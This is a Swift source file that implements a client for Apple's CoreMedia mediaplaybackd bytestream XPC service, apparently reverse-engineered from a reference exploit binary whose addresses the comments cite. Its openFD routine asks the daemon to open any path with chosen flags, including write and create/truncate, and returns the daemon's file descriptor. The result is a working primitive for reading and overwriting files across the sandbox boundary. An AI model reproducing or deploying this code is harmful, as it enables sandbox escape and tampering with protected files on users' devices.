<<<FILE MConfFS/Sources/FigByteStream.swift>>>
import Foundation
import CoreFoundation
import Darwin
import Dispatch

/// CoreMedia / mediaplaybackd bytestream XPC 客户端。
///
/// 接口依据（arm64 参考实现的调用点）：
///   dlopen "/System/Library/Frameworks/CoreMedia.framework/CoreMedia"   @0x100009b6c
///   dlsym  FigXPCCreateBasicMessage                                    @0x100009b88
///   mach service "com.apple.coremedia.mediaplaybackd.bytestream.xpc"   @0x100018b00
///   keys   CreationURL / FileOpenOptions / ByteStreamDetails
///          ObjectID / FileDescriptor                                   @0x100018ede…0x100018f1b
///   fd     xpc_dictionary_dup_fd(details, "FileDescriptor")            @0x10000baa0
///   flags  xpc_dictionary_set_uint64(msg, "FileOpenOptions", 0)        @0x10000b7d4
///
/// 与参考实现一致：所有 xpc_* / Fig* 都走 dlopen+dlsym，不依赖 XPC Swift 模块，
/// 因此不需要额外 SDK 头文件即可编译。
final class FigByteStream {

    static let serviceName = "com.apple.coremedia.mediaplaybackd.bytestream.xpc"

    /// FigXPCCreateBasicMessage 的第一个实参（与参考实现 @0x10000bab4 一致）
    static let messageType: UInt32 = 0x646f_6f6d

    static let kCreationURL      = "CreationURL"
    static let kFileOpenOptions  = "FileOpenOptions"
    static let kByteStreamDetail = "ByteStreamDetails"
    static let kObjectID         = "ObjectID"
    static let kFileDescriptor   = "FileDescriptor"

    typealias Ptr = UnsafeMutableRawPointer

    // MARK: - C 函数类型

    private typealias CreateBasicMessageFn = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<Ptr?>?) -> Int32
    private typealias SetCFURLFn           = @convention(c) (Ptr, CFString, CFURL) -> Int32

    // UNVERIFIED —— 由调用点寄存器用法推断，仅 .originHandshake 模式使用
    private typealias OriginBeginFn        = @convention(c) (Ptr, UnsafeMutablePointer<Ptr?>?) -> Int32
    private typealias OriginCompleteFn     = @convention(c) (Ptr, UnsafeMutablePointer<Ptr?>?) -> Int32
    private typealias RecipientCreateFn    = @convention(c) (Ptr, UInt64, UnsafeMutablePointer<Ptr?>?) -> Int32

    private typealias ConnCreateFn = @convention(c) (UnsafePointer<CChar>, Ptr?, UInt64) -> Ptr?
    private typealias ConnSetHandlerFn = @convention(c) (Ptr, @convention(block) (Ptr) -> Void) -> Void
    private typealias ConnResumeFn = @convention(c) (Ptr) -> Void
    private typealias ConnCancelFn = @convention(c) (Ptr) -> Void
    private typealias SendWithReplyFn = @convention(c) (Ptr, Ptr, Ptr?, @convention(block) (Ptr) -> Void) -> Void
    private typealias DictCreateFn = @convention(c) (Ptr?, Ptr?, Int) -> Ptr?
    private typealias DictSetU64Fn = @convention(c) (Ptr, UnsafePointer<CChar>, UInt64) -> Void
    private typealias DictGetValueFn = @convention(c) (Ptr, UnsafePointer<CChar>) -> Ptr?
    private typealias DictGetU64Fn = @convention(c) (Ptr, UnsafePointer<CChar>) -> UInt64
    private typealias DictDupFDFn = @convention(c) (Ptr, UnsafePointer<CChar>) -> Int32
    private typealias GetTypeFn = @convention(c) (Ptr) -> Ptr
    private typealias CopyDescFn = @convention(c) (Ptr) -> UnsafeMutablePointer<CChar>?
    private typealias ReleaseFn = @convention(c) (Ptr) -> Void

    private var createBasicMessage: CreateBasicMessageFn?
    private var setCFURL: SetCFURLFn?
    private var originBegin: OriginBeginFn?
    private var originComplete: OriginCompleteFn?
    private var recipientCreate: RecipientCreateFn?

    private var connCreate: ConnCreateFn?
    private var connSetHandler: ConnSetHandlerFn?
    private var connResume: ConnResumeFn?
    private var connCancel: ConnCancelFn?
    private var sendWithReply: SendWithReplyFn?
    private var dictCreate: DictCreateFn?
    private var dictSetU64: DictSetU64Fn?
    private var dictGetValue: DictGetValueFn?
    private var dictGetU64: DictGetU64Fn?
    private var dictDupFD: DictDupFDFn?
    private var getType: GetTypeFn?
    private var copyDesc: CopyDescFn?
    private var xpcRelease: ReleaseFn?
    private var dictTypeAddr: Ptr?      // &xpc_type_dictionary（变量地址）
    private var dictTypeValue: Ptr?     // xpc_type_dictionary 的值（真正的类型对象）

    private let queue = DispatchQueue(label: "mconffs.fig.xpc")
    private var conn: Ptr?

    var mode: FigMode = .direct
    var verbose = true
    private(set) var lastError = ""
    var onLog: ((String) -> Void)?

    // MARK: - 连接

    func connect() -> Bool {
        guard loadCoreMedia(), loadXPC() else { return false }
        guard let create = connCreate else { lastError = "xpc_connection_create_mach_service missing"; return false }
        guard let c = Self.serviceName.withCString({ create($0, nil, 0) }) else {
            lastError = "xpc_connection_create_mach_service returned nil"
            return false
        }
        connSetHandler?(c, { _ in })
        connResume?(c)
        conn = c
        log("connected \(Self.serviceName)")
        return true
    }

    func shutdown() {
        if let c = conn { connCancel?(c); xpcRelease?(c); log("connection cancelled and released") }
        conn = nil
    }

    private func loadCoreMedia() -> Bool {
        let path = "/System/Library/Frameworks/CoreMedia.framework/CoreMedia"
        guard let h = dlopen(path, RTLD_NOW) else {
            let e = dlerror().map { String(validatingUTF8: $0) ?? "?" } ?? "?"
            lastError = "dlopen CoreMedia failed: \(e)"
            return false
        }
        createBasicMessage = sym(h, "FigXPCCreateBasicMessage")
        setCFURL           = sym(h, "FigXPCMessageSetCFURL")
        originBegin        = sym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1")
        originComplete     = sym(h, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2")
        recipientCreate    = sym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2")
        guard createBasicMessage != nil, setCFURL != nil else {
            lastError = "required CoreMedia symbol missing"
            return false
        }
        return true
    }

    private func loadXPC() -> Bool {
        // XPC 在 libSystem 里；RTLD_DEFAULT 直接查全局符号
        connCreate     = sym(nil, "xpc_connection_create_mach_service")
        connSetHandler = sym(nil, "xpc_connection_set_event_handler")
        connResume     = sym(nil, "xpc_connection_resume")
        connCancel     = sym(nil, "xpc_connection_cancel")
        sendWithReply  = sym(nil, "xpc_connection_send_message_with_reply")
        dictCreate     = sym(nil, "xpc_dictionary_create")
        dictSetU64     = sym(nil, "xpc_dictionary_set_uint64")
        dictGetValue   = sym(nil, "xpc_dictionary_get_value")
        dictGetU64     = sym(nil, "xpc_dictionary_get_uint64")
        dictDupFD      = sym(nil, "xpc_dictionary_dup_fd")
        getType        = sym(nil, "xpc_get_type")
        copyDesc       = sym(nil, "xpc_copy_description")
        xpcRelease     = sym(nil, "xpc_release")
        dictTypeAddr   = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "xpc_type_dictionary")
        // dlsym 拿到的是「变量地址」，而 xpc_get_type 返回的是该变量里存的「类型对象」。
        // 直接比地址会永远不相等，reply 就永远被判成非字典。
        if let addr = dictTypeAddr { dictTypeValue = addr.load(as: Ptr.self) }
        let missing = [connCreate == nil, connSetHandler == nil, connResume == nil,
                       sendWithReply == nil, dictSetU64 == nil, dictGetValue == nil,
                       dictDupFD == nil, dictGetU64 == nil, getType == nil].contains(true)
        if missing { lastError = "xpc symbol missing from libSystem" }
        return !missing
    }

    private func sym<T>(_ h: UnsafeMutableRawPointer?, _ name: String) -> T? {
        let handle = h ?? UnsafeMutableRawPointer(bitPattern: -2)   // RTLD_DEFAULT
        guard let p = dlsym(handle, name) else { return nil }
        return unsafeBitCast(p, to: T.self)
    }

    // MARK: - 打开目标，取回服务端 fd

    /// flags 原样交给服务端的 open(2)：
    ///   0                                 只读（**目录枚举必须用它**，O_RDWR 打开目录会 EISDIR）
    ///   O_WRONLY(1) / O_RDWR(2)           可写
    ///   O_RDWR|O_CREAT|O_TRUNC (0x602)    创建/截断后写入
    func openFD(path: String, flags: Int32) -> Int32? {
        guard let c = conn else { lastError = "not connected"; return nil }
        guard let msg = makeMessage(path: path, flags: flags) else {
            lastError = "FigXPCCreateBasicMessage failed"
            return nil
        }
        defer { xpcRelease?(msg) }

        if mode == .originHandshake { _ = performHandshake(msg: msg) }

        guard let reply = sendSync(c, msg) else { return nil }
        defer { xpcRelease?(reply) }
        if verbose { log("reply: \(describe(reply))") }

        var detailsPtr: Ptr?
        Self.kByteStreamDetail.withCString { detailsPtr = dictGetValue?(reply, $0) }
        guard let details = detailsPtr else {
            lastError = "reply has no ByteStreamDetails"
            return nil
        }
        let fd = Self.kFileDescriptor.withCString { dictDupFD?(details, $0) ?? -1 }
        guard fd >= 0 else {
            lastError = "reply has no FileDescriptor (server refused open)"
            return nil
        }
        if verbose {
            let oid = Self.kObjectID.withCString { dictGetU64?(details, $0) ?? 0 }
            log("fd=\(fd) ObjectID=\(oid) flags=0x\(String(flags, radix: 16))")
        }
        return fd
    }

    private func makeMessage(path: String, flags: Int32) -> Ptr? {
        var msg: Ptr?
        if let create = createBasicMessage {
            var out: Ptr?
            let st = create(Self.messageType, 0, &out)
            if verbose { log("FigXPCCreateBasicMessage status=\(st)") }
            msg = out
        }
        if msg == nil { msg = dictCreate?(nil, nil, 0) }
        guard let m = msg, let set = setCFURL, let opts = dictSetU64 else { return msg }
        let url = URL(fileURLWithPath: path) as CFURL
        let st = set(m, Self.kCreationURL as CFString, url)
        if verbose { log("FigXPCMessageSetCFURL(CreationURL) status=\(st)") }
        Self.kFileOpenOptions.withCString { opts(m, $0, UInt64(bitPattern: Int64(flags))) }
        return m
    }

    /// UNVERIFIED：两段式握手，返回 false 时上层仍走 .direct 逻辑
    private func performHandshake(msg: Ptr) -> Bool {
        guard let c = conn, let begin = originBegin, let complete = originComplete else { return false }
        var m2: Ptr?
        let st1 = begin(msg, &m2)
        log("Origin begin: status=\(st1)")
        guard st1 == 0, let m2u = m2 else { return false }
        defer { xpcRelease?(m2u) }
        guard let r1 = sendSync(c, m2u) else { return false }
        defer { xpcRelease?(r1) }
        var m3: Ptr?
        let st2 = complete(r1, &m3)
        log("Origin complete: status=\(st2)")
        guard st2 == 0, let m3u = m3 else { return false }
        defer { xpcRelease?(m3u) }
        if let r2 = sendSync(c, m3u) {
            defer { xpcRelease?(r2) }
            var rec: Ptr?
            let oid = Self.kObjectID.withCString { dictGetU64?(r2, $0) ?? 0 }
            let st3 = recipientCreate?(m3u, oid, &rec) ?? -1
            log("Recipient creation: status=\(st3)")
        }
        return true
    }

    // MARK: - 同步收发

    private func sendSync(_ c: Ptr, _ msg: Ptr) -> Ptr? {
        guard let send = sendWithReply else { lastError = "send missing"; return nil }
        let sem = DispatchSemaphore(value: 0)
        var result: Ptr?
        send(c, msg, nil) { reply in
            // 不在这里做类型判定：reply 可能是字典，也可能是 XPC 错误对象，
            // 交给上层按 key 取值时自然失败并报错，避免误判导致永远拿不到结果。
            if reply != nil { result = reply }
            sem.signal()
        }
        if sem.wait(timeout: .now() + 10) == .timedOut {
            lastError = "send_message_with_reply timeout"
            return nil
        }
        if result == nil {
            lastError = conn == nil ? "not connected" : "no reply object"
        }
        return result
    }

    private func describe(_ o: Ptr) -> String {
        guard let d = copyDesc?(o) else { return "<nil>" }
        defer { free(d) }
        return String(cString: d).replacingOccurrences(of: "\n", with: " ")
    }

    private func log(_ s: String) { onLog?(s) }
}

enum FigMode {
    case direct
    case originHandshake
}
